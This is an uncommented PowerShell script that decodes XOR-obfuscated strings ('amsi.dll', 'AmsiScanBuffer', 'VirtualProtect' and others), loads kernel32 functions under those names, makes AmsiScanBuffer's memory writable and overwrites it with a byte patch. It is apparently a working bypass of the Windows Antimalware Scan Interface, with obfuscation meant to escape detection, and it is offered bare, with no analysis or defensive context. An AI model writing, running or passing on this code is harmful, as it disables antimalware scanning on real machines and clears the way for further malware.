
$xk = 0x55

# Define the input arrays
$ad = @(12,2,100,47,52,6,96,62,55,18,34,104)
$ASB = @(4,2,100,47,52,3,27,63,12,2,96,22,49,2,15,56,15,13,28,104)
$VP = @(3,56,57,44,49,29,3,61,55,19,23,44,55,102,7,57,12,102,4,104)
$GPA = @(7,103,3,101,0,29,31,35,12,101,19,62,15,29,31,57,54,102,24,104)
$Cp = @(4,103,108,34,48,4,104,104)
$LLi = @(1,18,108,61,15,16,45,37,12,59,31,61,54,59,62,104)

function DA {
    param (
        [Parameter(Mandatory=$true)]
        [array]$array,
        [Parameter(Mandatory=$true)]
        [int]$xk
    )

    $uxv = $array | ForEach-Object { $_ -bxor $xk }

    $chars = $uxv | ForEach-Object { [char]$_ }
    $b64_str = -join $chars
    
    $bytes = [System.Convert]::FromBase64String($b64_str)
    
    $inputString = [System.Text.Encoding]::UTF8.GetString($bytes)
    return $inputString
}

$ad_d = DA $ad $xk
$ASB_d = DA $ASB $xk
$VP_d = DA $VP $xk
$GPA_d = DA $GPA $xk
$Cp_d = DA $Cp $xk
$LLi_d = DA $LLi $xk

$chtp=[byte[]](0xB8, 0x46, 0xE5, 0x9B, 0xB3, 0x05, 0x45, 0x21, 0xFD, 0x3E, 0x2D, 0x12, 0xD3, 0x42, 0x43, 0x35, 0x2E, 0x33, 0x51, 0x2F, 0xC3)





$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr $GPA_D(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr $LLi_d(string name);
    [DllImport("kernel32")]
    public static extern bool $VP_d(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32


$LLi_d2 = [Win32]::$LLi_d($ad_d)
$aDd = [Win32]::$GPA_d($LLi_d2, $ASB_d)
$ipip = 0
[Win32]::$VP_d($aDd, [uint32]5, 0x40, [ref]$ipip)

[System.Runtime.InteropServices.Marshal]::$Cp_d($chtp, 0, $aDd, $chtp.Length)